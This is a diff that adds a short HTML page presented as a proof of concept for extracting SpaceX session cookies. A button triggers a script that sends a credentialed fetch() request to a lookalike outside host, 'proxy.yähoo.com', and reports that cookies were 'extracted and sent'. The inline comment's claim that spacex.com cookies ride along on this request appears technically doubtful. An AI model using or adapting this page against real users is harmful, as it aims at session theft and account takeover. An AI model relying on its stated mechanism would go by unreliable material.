@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Spacex Cookie Extractor</title>
+</head>
+<body>
+  <h2>PoC: Extract Spacex Session Cookies</h2>
+  <button onclick="stealCookies()">Extract & Send My Cookies</button>
+
+  <script>
+    function stealCookies() {
+      fetch('https://proxy.yähoo.com/trace-capture', {
+        method: 'GET',
+        credentials: 'include'  // Browser includes `.spacex.com` cookies here
+      }).then(response => response.text())
+        .then(data => alert("Cookies extracted and sent!"))
+        .catch(err => alert("Error: " + err));
+    }
+  </script>
+</body>
+</html>
